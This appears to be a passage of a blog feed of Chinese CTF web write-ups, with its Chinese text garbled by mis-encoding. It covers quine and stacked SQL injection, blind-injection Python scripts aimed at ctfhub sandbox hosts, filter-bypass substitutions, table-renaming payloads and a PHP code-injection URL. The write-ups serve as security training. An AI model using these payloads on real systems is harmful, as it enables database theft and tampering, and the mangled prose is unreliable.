class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkSql</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/regexp|between|in|flag| =| &gt;|&lt; |and|\||right|left|reverse|update|extractvalue|floor|substr|&amp;|;|\\\$|0x|sleep|\ /i&quot;</span>,<span class="variable">$s</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">alertMes</span>(<span class="string">&#x27;hacker&#x27;</span>, <span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>æ¨¡å¼åˆ†éš”ç¬¦åçš„â€iâ€æ ‡è®°è¿™æ˜¯ä¸€ä¸ªå¤§å°å†™ä¸æ•æ„Ÿçš„æœç´¢</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sleep</span> å¯ä»¥ç”¨benchmarkä»£æ›¿</span><br><span class="line">&lt;,&gt; å¯ä»¥ç”¨least(),greatest()ä»£æ›¿</span><br><span class="line">=,<span class="keyword">in</span> å¯ä»¥ç”¨likeä»£æ›¿</span><br><span class="line">substr å¯ä»¥ç”¨midä»£æ›¿</span><br><span class="line">ç©ºæ ¼ å¯ä»¥ç”¨/**/ä»£æ›¿</span><br></pre></td></tr></table></figure><ol start="3"><li>æ³¨å…¥è„šæœ¬æµ‹è¯•</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">char = <span class="string">&#x27;01234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ/*-+?~#!@&amp;%&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">password</span>():</span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    url = <span class="string">&#x27;http://challenge-f48e2f483110ea2f.sandbox.ctfhub.com:10800/index.php&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> char:</span><br><span class="line">            payload = &#123;<span class="string">&quot;username&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">                       <span class="string">&quot;password&quot;</span>: <span class="string">f&quot;1&#x27;or/**/password/**/like/**/&#x27;<span class="subst">&#123;flag + i&#125;</span>%&#x27;#&quot;</span></span><br><span class="line">                       &#125;</span><br><span class="line">            <span class="comment"># print(payload)</span></span><br><span class="line">            res = requests.post(url=url, data=payload)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;something wrong&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> res.text:</span><br><span class="line">                flag += i</span><br><span class="line">                <span class="built_in">print</span>(flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;ctfhub&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;game over&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">elif</span> <span class="string">&quot;~&quot;</span> <span class="keyword">in</span> i:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;just ok&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    password()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>è¿è¡Œç»“æœ <code>o2cqmlyo0kpjkdyocm8cfbygzaievxbw       just ok</code></strong></p><p>é€šè¿‡<code>ç”¨æˆ·å admin</code> <code>å¯†ç  o2cqmlyo0kpjkdyocm8cfbygzaievxbw</code> ç™»å½• è¿˜æ˜¯æ˜¾ç¤ºé”™è¯¯ </p><ol start="4"><li>é€šè¿‡ç½‘ä¸Šwriteup å‘ç°</li></ol><p>ä½¿ç”¨äº† <strong>quineæ³¨å…¥</strong></p><p><strong>1.é¦–å…ˆå…ˆäº†è§£ä¸€ä¸‹replace()å‡½æ•°</strong></p><ul><li>replace(object,search,replace)</li><li>æŠŠobjectå¯¹è±¡ä¸­å‡ºç°çš„çš„searchå…¨éƒ¨æ›¿æ¢æˆreplace</li></ul><p>æ³¨å…¥çš„payload:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;/**/union/**/select/**/</span></span><br><span class="line"><span class="string">replace(replace(&#x27;</span><span class="number">1</span>&quot;/**/union/**/select/**/replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)#&#x27;,char(34),char(39)),char(46),&#x27;1&quot;<span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>replace(replace(&quot;.&quot;,<span class="type">char</span>(<span class="number">34</span>),<span class="type">char</span>(<span class="number">39</span>)),<span class="type">char</span>(<span class="number">46</span>),&quot;.&quot;)#<span class="string">&#x27;)#</span></span><br></pre></td></tr></table></figure><p><code>CHAR(34)=&quot;       CHAR(39)=&#39;        CHAR(33)=!         char(46)=.</code></p><h2 id="quineæ³¨å…¥"><a href="#quineæ³¨å…¥" class="headerlink" title="quineæ³¨å…¥"></a>quineæ³¨å…¥</h2><blockquote><p>æ ¸å¿ƒæ€æƒ³ï¼š</p><p>sqlè¯­å¥æ‰§è¡Œçš„ç»“æœç­‰äºsqlè¯­å¥æœ¬èº«</p></blockquote><p>å³åˆ©ç”¨sqlæ‰§è¡Œçš„ç»“æœç­‰äºå®ƒæœ¬èº«ç»•è¿‡åˆ¤æ–­ï¼š</p><p>$row[â€˜passwordâ€™] &#x3D;&#x3D;&#x3D; $password</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select replace(replace(&#x27;</span><span class="number">1</span>&quot; union select replace(replace(&quot;.&quot;,&quot;,<span class="string">&#x27;) ,., &quot;.&quot;)#&#x27;</span>,&quot;, &#x27;), ., &#x27;1 union select replace(replace(&quot;.&quot;, &quot;,<span class="string">&#x27;), ., &quot;.&quot;)#&#x27;</span>)#</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;2021-ç¬¬äº”ç©ºé—´æ™ºèƒ½å®‰å…¨å¤§èµ›-Web-yet-another-mysql-injection&quot;&gt;&lt;a href=&quot;#2021-ç¬¬äº”ç©ºé—´æ™ºèƒ½å®‰å…¨å¤§èµ›-Web-yet-another-mysql-injection&quot; class=&quot;headerlink&quot; title</summary>
      
    
    
    
    <category term="CTF" scheme="https://iahzl.github.io/categories/CTF/"/>
    
    <category term="ctfhub" scheme="https://iahzl.github.io/categories/CTF/ctfhub/"/>
    
    
    <category term="web" scheme="https://iahzl.github.io/tags/web/"/>
    
    <category term="sqlæ³¨å…¥" scheme="https://iahzl.github.io/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>find_it</title>
    <link href="https://iahzl.github.io/find-it/"/>
    <id>https://iahzl.github.io/find-it/</id>
    <published>2023-08-06T02:19:27.000Z</published>
    <updated>2023-08-06T02:36:55.887Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2021-ç¬¬å››å±Šçº¢å¸½æ¯ç½‘ç»œå®‰å…¨å¤§èµ›-Web-find-it"><a href="#2021-ç¬¬å››å±Šçº¢å¸½æ¯ç½‘ç»œå®‰å…¨å¤§èµ›-Web-find-it" class="headerlink" title="2021-ç¬¬å››å±Šçº¢å¸½æ¯ç½‘ç»œå®‰å…¨å¤§èµ›-Web-find_it"></a>2021-ç¬¬å››å±Šçº¢å¸½æ¯ç½‘ç»œå®‰å…¨å¤§èµ›-Web-find_it</h1><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230730102906291-1691288556204-1.png" alt="image-20230730102906291"></p><ol><li>é¦–å…ˆè¿›é¡¹ç«¯å£æ‰«æ<code>dirsearch</code></li></ol><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230730103550756-1691288556205-2.png" alt="image-20230730103550756"></p><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230730103615203-1691288556205-3.png" alt="image-20230730103615203"></p><ol><li>robots.txt æ–‡ä»¶å†…å®¹</li></ol><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230730103720699-1691288556205-4.png" alt="image-20230730103720699"></p><ol><li>1ndexx.php æ‰“å¼€404 ï¼Œå°è¯•æ‰“å¼€å¤‡ä»½æ–‡ä»¶<code>.1ndexx.php.swp</code></li></ol><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230730103951694-1691288556205-5.png" alt="image-20230730103951694"></p><ol><li>æŸ¥çœ‹æºä»£ç </li></ol><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230730105041270-1691288556205-6.png" alt="image-20230730105041270"></p><ol><li>ç›´æ¥è®¿é—®<a href="https://so.csdn.net/so/search?q=hack&spm=1001.2101.3001.7020">hack</a>.phpæ— æ³•è®¿é—® <code>show_source()</code>è¯»å–æ–‡ä»¶ï¼š</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=&lt;?php show_source(__FILE__);?&gt;</span><br></pre></td></tr></table></figure><ul><li><code>http://challenge-e1e88976b18bb969.sandbox.ctfhub.com:10800/index.php?code=&lt;?php show_source(__FILE__);?&gt;</code></li><li><code>http://challenge-e1e88976b18bb969.sandbox.ctfhub.com:10800/hack.php</code></li></ul><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230730105401597-1691288556205-7.png" alt="image-20230730105401597"></p><h4 id="å…³äºshow-source"><a href="#å…³äºshow-source" class="headerlink" title="å…³äºshow_source()"></a>å…³äºshow_source()</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">show_source() å‡½æ•°å¯¹æ–‡ä»¶è¿›è¡Œè¯­æ³•é«˜äº®æ˜¾ç¤ºã€‚</span><br><span class="line">æœ¬å‡½æ•°æ˜¯ highlight_file() çš„åˆ«å</span><br><span class="line">12</span><br></pre></td></tr></table></figure><h4 id="å…³äº-swpç¼“å­˜æ–‡ä»¶"><a href="#å…³äº-swpç¼“å­˜æ–‡ä»¶" class="headerlink" title="å…³äº.swpç¼“å­˜æ–‡ä»¶"></a>å…³äº.swpç¼“å­˜æ–‡ä»¶</h4><p>æ–‡ä»¶æ³„éœ²(.swpå¤‡ä»½æ–‡ä»¶):éæ­£å¸¸å…³é—­vi&#x2F;<a href="https://so.csdn.net/so/search?q=vim%E7%BC%96%E8%BE%91%E5%99%A8&spm=1001.2101.3001.7020">vimç¼–è¾‘å™¨</a>æ—¶ä¼šç”Ÿæˆä¸€ä¸ª.swpæ–‡ä»¶ </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è°ƒç”¨è¿™ç±»çš„éšè—æ–‡ä»¶çš„æ—¶å€™ï¼Œéœ€è¦åœ¨æœ€å‰é¢åŠ .</span><br></pre></td></tr></table></figure><h4 id="å®˜æ–¹WriteUp"><a href="#å®˜æ–¹WriteUp" class="headerlink" title="å®˜æ–¹WriteUp"></a>å®˜æ–¹WriteUp</h4><p><a href="https://writeup.ctfhub.com/Challenge/2021/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%BA%A2%E5%B8%BD%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/Web/oKTHZCKnTRgZzifYg5twqZ.html">find_it | CTFHub</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;2021-ç¬¬å››å±Šçº¢å¸½æ¯ç½‘ç»œå®‰å…¨å¤§èµ›-Web-find-it&quot;&gt;&lt;a href=&quot;#2021-ç¬¬å››å±Šçº¢å¸½æ¯ç½‘ç»œå®‰å…¨å¤§èµ›-Web-find-it&quot; class=&quot;headerlink&quot; title=&quot;2021-ç¬¬å››å±Šçº¢å¸½æ¯ç½‘ç»œå®‰å…¨å¤§èµ›-Web-find_it&quot;&gt;&lt;/a</summary>
      
    
    
    
    <category term="CTF" scheme="https://iahzl.github.io/categories/CTF/"/>
    
    <category term="ctfhub" scheme="https://iahzl.github.io/categories/CTF/ctfhub/"/>
    
    
    <category term="web" scheme="https://iahzl.github.io/tags/web/"/>
    
    <category term="å¤‡ä»½æ–‡ä»¶æ³„éœ²" scheme="https://iahzl.github.io/tags/%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2/"/>
    
  </entry>
  
  <entry>
    <title>éšä¾¿æ³¨ 1</title>
    <link href="https://iahzl.github.io/%E9%9A%8F%E4%BE%BF%E6%B3%A8-1/"/>
    <id>https://iahzl.github.io/%E9%9A%8F%E4%BE%BF%E6%B3%A8-1/</id>
    <published>2023-08-05T11:35:34.000Z</published>
    <updated>2023-08-06T02:29:47.170Z</updated>
    
    <content type="html"><![CDATA[<h3 id="å¼ºç½‘æ¯2019-éšä¾¿æ³¨"><a href="#å¼ºç½‘æ¯2019-éšä¾¿æ³¨" class="headerlink" title="å¼ºç½‘æ¯2019-éšä¾¿æ³¨"></a>å¼ºç½‘æ¯2019-éšä¾¿æ³¨</h3><p>1ï¼Œæµ‹è¯•<code>1&#39; or 1=1 #</code>,åˆæ­¥åˆ¤å®šå­˜åœ¨SQLæ³¨å…¥ã€‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; or 1=1 #</span></span><br></pre></td></tr></table></figure><p>å†æµ‹è¯•å­—æ®µæ•°ï¼Œåˆ°3æ—¶æŠ¥é”™ï¼Œè¯´æ˜å­—æ®µæ•°ä¸º2.</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; order by 1 # </span></span><br></pre></td></tr></table></figure><p>æ¥ç€å°è¯•unionæ³¨å…¥,å›æ˜¾äº†è¿‡æ»¤çš„å…³é”®å­—ã€‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select 1,2#</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230726152210746.png" alt="image-20230726152210746"></p><p>ç„¶åå°±æ˜¯ä»Šå¤©å­¦ä¼šçš„æ–°å§¿åŠ¿â€œå †å æ³¨å…¥â€äº†ã€‚<br>åŸç†å¾ˆç®€å•ï¼Œå°±æ˜¯é€šè¿‡ ; å·æ³¨å…¥å¤šæ¡SQLè¯­å¥ã€‚<br>å…ˆé€šè¿‡show databasesçˆ†å‡ºæ•°æ®åº“ã€‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span><span class="string">&#x27;; show databases; #</span></span><br></pre></td></tr></table></figure><p>ç„¶åç”¨ show tables å°è¯•çˆ†è¡¨ã€‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span><span class="string">&#x27;; show tables; #</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œæœ‰ä¸¤ä¸ªè¡¨ï¼Œæˆ‘ä»¬å…ˆå°è¯•çˆ†wordsè¡¨çš„å†…å®¹ã€‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;; show columns from words; #</span></span><br></pre></td></tr></table></figure><p>è¡¨åä¸ºæ•°å­—æ—¶ï¼Œè¦ç”¨åå¼•å·åŒ…èµ·æ¥æŸ¥è¯¢ã€‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span><span class="string">&#x27;; show columns from `1919810931114514 `; #</span></span><br></pre></td></tr></table></figure><p>1ï¼Œé€šè¿‡ rename å…ˆæŠŠ words è¡¨æ”¹åä¸ºå…¶ä»–çš„è¡¨åã€‚</p><p>2ï¼ŒæŠŠ 1919810931114514 è¡¨çš„åå­—æ”¹ä¸º words ã€‚</p><p>3 ï¼Œç»™æ–° words è¡¨æ·»åŠ æ–°çš„åˆ—å id ã€‚</p><p>4ï¼Œå°† flag æ”¹åä¸º data ã€‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;; rename table words to word1; rename table `1919810931114514` to words;alter table words add id    int unsigned not Null auto_increment primary key; alter table words change flag data varchar(100);#</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;å¼ºç½‘æ¯2019-éšä¾¿æ³¨&quot;&gt;&lt;a href=&quot;#å¼ºç½‘æ¯2019-éšä¾¿æ³¨&quot; class=&quot;headerlink&quot; title=&quot;å¼ºç½‘æ¯2019-éšä¾¿æ³¨&quot;&gt;&lt;/a&gt;å¼ºç½‘æ¯2019-éšä¾¿æ³¨&lt;/h3&gt;&lt;p&gt;1ï¼Œæµ‹è¯•&lt;code&gt;1&amp;#39; or 1=1 #&lt;/code&gt;,åˆ</summary>
      
    
    
    
    <category term="CTF" scheme="https://iahzl.github.io/categories/CTF/"/>
    
    <category term="BUUCTF" scheme="https://iahzl.github.io/categories/CTF/BUUCTF/"/>
    
    
    <category term="sqlæ³¨å…¥" scheme="https://iahzl.github.io/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
    <category term="buuctf" scheme="https://iahzl.github.io/tags/buuctf/"/>
    
  </entry>
  
  <entry>
    <title>WebsiteManger</title>
    <link href="https://iahzl.github.io/WebsiteManger/"/>
    <id>https://iahzl.github.io/WebsiteManger/</id>
    <published>2023-08-05T09:11:21.000Z</published>
    <updated>2023-08-06T02:24:02.587Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2021-ç¬¬å››å±Šçº¢å¸½æ¯ç½‘ç»œå®‰å…¨å¤§èµ›-Web-WebsiteManger"><a href="#2021-ç¬¬å››å±Šçº¢å¸½æ¯ç½‘ç»œå®‰å…¨å¤§èµ›-Web-WebsiteManger" class="headerlink" title="2021-ç¬¬å››å±Šçº¢å¸½æ¯ç½‘ç»œå®‰å…¨å¤§èµ›-Web-WebsiteManger"></a>2021-ç¬¬å››å±Šçº¢å¸½æ¯ç½‘ç»œå®‰å…¨å¤§èµ›-Web-WebsiteManger</h1><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230729200208646.png" alt="image-20230729200208646"></p><ol><li>é¦–å…ˆf12æ£€æŸ¥æºæ–‡ä»¶ å‘ç°å›¾ç‰‡å¯èƒ½å­˜åœ¨æ³¨å…¥ç‚¹ ï¼š</li></ol><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230729200355574.png" alt="image-20230729200355574"></p><p><strong>å¸ƒå°”ç›²æ³¨çŸ¥è¯†ç‚¹</strong></p><ul><li>&#x2F;image.php?id&#x3D;if(1&#x3D;1,1,5)              True</li><li>&#x2F;image.php?id&#x3D;if(1&#x3D;2,1,5)              False</li></ul><p><code>è§£é‡Š: æ¡ä»¶ä¸ºçœŸæ—¶?id=1ï¼Œå›æ˜¾ç¬¬ä¸€å¼ å›¾ç‰‡ï¼Œæ¡ä»¶ä¸ºå‡æ—¶?id=5ï¼Œæ²¡æœ‰id=5çš„å›¾ç‰‡ï¼Œä»€ä¹ˆéƒ½æ²¡æœ‰ã€‚å³å¯ä½œä¸ºå¸ƒå°”ç›²æ³¨åˆ¤æ–­æ¡ä»¶</code></p><ol start="2"><li>è„šæœ¬æµ‹è¯•ï¼š</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">all_str = <span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!&quot;#$%&amp;\&#x27;()*+,-./:;&lt;=&gt;?@[\]^_`&#123;|&#125;~&#x27;</span></span><br><span class="line">url = <span class="string">&#x27;http://challenge-ebd076868bb77c54.sandbox.ctfhub.com:10800/image.php&#x27;</span></span><br><span class="line">info = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> all_str:</span><br><span class="line">        payload = <span class="string">&#x27;?id=if((ascii(mid(database(),&#123;&#125;,1))=&#123;&#125;),1,5)&#x27;</span>.<span class="built_in">format</span>(i, <span class="built_in">ord</span>(s))</span><br><span class="line">        ans = requests.get(url=url + payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(ans.text) &gt; <span class="number">1000</span>:</span><br><span class="line">            info += s</span><br><span class="line">            <span class="built_in">print</span>(payload)</span><br><span class="line">            <span class="built_in">print</span>(info)</span><br></pre></td></tr></table></figure><p>ä»¥ä¸Šåˆ¤æ–­å‡º<code>database()=ctf</code></p><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230729200757857.png" alt="image-20230729200757857"></p><ol start="3"><li>æ ¹æ®ç½‘ä¸Šwriteupæ¸…æ™°å¾—çŸ¥ï¼š</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#çˆ†ç ´æ•°æ®åº“</span></span><br><span class="line">payload = <span class="string">&#x27;?id=if((ascii(mid(database(),&#123;&#125;,1))=&#123;&#125;),1,5)&#x27;</span>.<span class="built_in">format</span>(i,<span class="built_in">ord</span>(s))</span><br><span class="line"><span class="comment">#çˆ†ç ´è¡¨å</span></span><br><span class="line">payload = <span class="string">&#x27;?id=if(ascii(mid((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=\&#x27;ctf\&#x27;),&#123;&#125;,1))=&#123;&#125;,1,5)&#x27;</span>.<span class="built_in">format</span>(i,<span class="built_in">ord</span>(s))</span><br><span class="line"><span class="comment">#çˆ†ç ´åˆ—å</span></span><br><span class="line">payload = <span class="string">&#x27;?id=if(ascii(mid((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=\&#x27;users\&#x27;),&#123;&#125;,1))=&#123;&#125;,1,5)&#x27;</span>.<span class="built_in">format</span>(i,<span class="built_in">ord</span>(s))</span><br><span class="line"><span class="comment">#çˆ†ç ´å­—æ®µ</span></span><br><span class="line">payload = <span class="string">&#x27;?id=if(ascii(mid((select/**/group_concat(username,password)/**/from/**/ctf.users),&#123;&#125;,1))=&#123;&#125;,1,5)&#x27;</span>.<span class="built_in">format</span>(i,<span class="built_in">ord</span>(s))</span><br><span class="line">è¿™é‡Œåœ¨åšé¢˜çš„æ—¶å€™ï¼Œå‘ç°çˆ†ç ´å­—æ®µå¾—åˆ°çš„ç»“æœä¸æ˜¯ctfä¸‹çš„usersçš„å­—æ®µï¼Œå› ä¸ºæ²¡æœ‰åŠ ctfè¿™ä¸ªé™åˆ¶ï¼Œåº”è¯¥æ˜¯çˆ†ç ´åˆ°äº†å…¶ä»–æ•°æ®åº“ä¸‹çš„usersä¸­çš„å­—æ®µï¼Œéœ€è¦åŠ ä¸Šæ•°æ®åº“åctfçš„é™åˆ¶æ¡ä»¶ï¼Œä¸è¿‡è¿™é‡Œé¢˜ç›®æœ‰å¯¹ â€˜<span class="keyword">and</span>â€™å…³é”®å­—è¿‡æ»¤ï¼Œæ‰€ä»¥éœ€è¦ç”¨â€˜&amp;&amp;â€™æ›¿æ¢ï¼Œè€Œä¸”è¿˜è¦ç¼–ç ä¸ºulræ ¼å¼â€˜%<span class="number">26</span>%<span class="number">26</span>â€™ï¼Œè¿™é‡Œä¹Ÿæ˜¯ç”¨brupsuitæŠ“åŒ…åˆ†æäº†å¾ˆä¹…æ‰å‘ç°çš„ï¼Œä¸è¿‡åªè¦æœ‰è€å¿ƒï¼Œæœ€ç»ˆè¿˜æ˜¯ä¼šå‘ç°ã€‚</span><br><span class="line">ä¿®æ”¹åçš„payload</span><br><span class="line">payload = <span class="string">&#x27;?id=if(ascii(mid((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=\&#x27;users\&#x27;/**/%26%26/**/table_schema=database()),&#123;&#125;,1))=&#123;&#125;,1,5)&#x27;</span>.<span class="built_in">format</span>(i, <span class="built_in">ord</span>(s))</span><br></pre></td></tr></table></figure><ul><li>å…³é”®å‡½æ•°è§£é‡Š<ul><li>mid() å‡½æ•°ï¼šæˆªå–å­—ç¬¦ä¸²ä¸€éƒ¨åˆ†ï¼Œmid(column_name,start[,length])</li><li>ord() å‡½æ•°ï¼šæ˜¯ chr() å‡½æ•°ï¼ˆå¯¹äº8ä½çš„ASCIIå­—ç¬¦ä¸²ï¼‰ï¼Œå®ƒä»¥ä¸€ä¸ªå­—ç¬¦ï¼ˆé•¿åº¦ä¸º1çš„å­—ç¬¦ä¸²ï¼‰ä½œä¸ºå‚æ•°ï¼Œè¿”å›å¯¹åº”çš„ ASCII æ•°å€¼ã€‚è¿”å›å€¼æ˜¯å¯¹åº”çš„åè¿›åˆ¶æ•´æ•°ã€‚</li><li>group_concat() å‡½æ•°ï¼šè¿æ¥ä¸€ä¸ªç»„çš„æ‰€æœ‰å­—ç¬¦ä¸²ï¼Œå¹¶ä»¥é€—å·åˆ†éš”æ¯ä¸€æ¡æ•°æ®ã€‚èƒ½ä¸€æ¬¡æ€§æŸ¥å‡ºæ‰€æœ‰ä¿¡æ¯ã€‚group_concat(str1,str2,â€¦)</li></ul></li></ul><ol start="4"><li>æœ€åå¾—çŸ¥çš„ä¿¡æ¯</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Tables_in_ctf: users,images</span><br><span class="line"></span><br><span class="line">Columns_in_users: USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,<span class="built_in">id</span>,username,password(æ­¤å¤„ä¸writeupæœ‰å‡ºå…¥)</span><br><span class="line"></span><br><span class="line">values_in_users: adminf5b86501931f812ed3833dee67a43603</span><br><span class="line"> adminc6ef523a171bb9a25f4115044b507d69</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230729202534279.png" alt="image-20230729202534279"></p><ol start="5"><li>ç™»å½•æˆåŠŸå</li></ol><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230729204501099.png" alt="image-20230729204501099"></p><p>æ­¤å¤„æµ‹è¯•å‘ç°æœ‰ssrfæ¼æ´ <code>è¾“å‡º127.0.0.1ååé¦ˆä¿¡æ¯å‡ºç°äº†(curl)</code></p><p><img src="https://cdn.jsdelivr.net/gh/iahzl/iahzl_bed/img/image-20230729204645428.png" alt="image-20230729204645428"></p><p>æŠ“åŒ…å¾—åˆ°flag</p><p><img 